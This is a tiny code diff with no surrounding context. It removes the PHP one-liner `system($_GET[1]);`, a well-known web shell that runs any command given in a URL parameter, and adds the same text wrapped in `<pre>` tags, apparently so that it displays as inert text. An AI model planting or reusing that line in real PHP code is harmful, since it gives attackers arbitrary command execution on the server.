@@ -1,1 +1,1 @@
-system($_GET[1]);
+<pre>system($_GET[1])</pre>
